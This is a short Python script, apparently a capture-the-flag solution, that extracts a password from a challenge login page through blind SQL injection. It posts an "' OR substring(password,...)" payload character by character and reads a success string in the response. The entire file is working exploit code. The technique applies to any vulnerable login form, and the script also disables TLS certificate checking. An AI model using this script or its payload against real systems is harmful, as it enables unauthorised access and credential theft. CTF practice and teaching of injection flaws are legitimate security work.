import requests

url = 'https://cryptixctf.com/web3/login.php'

chars = '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ'
hexchars = '_0123456789abcdefghijklmnopqrstuvwxyz'
password = ''

counter = 0
for i in range(1,33):
    counter = 0
    for j in hexchars:
        payload ="' OR substring(password,{},1) = '{}'#".format(i,j)
        postdata = {'pwd':payload}
        req = requests.post(url,data=postdata,verify=False)
        print req.text
        if 'You thought it' in req.text:
            counter = 1
            password += j
            print password
            break
    if counter == 0:
        break

print '-------'+password

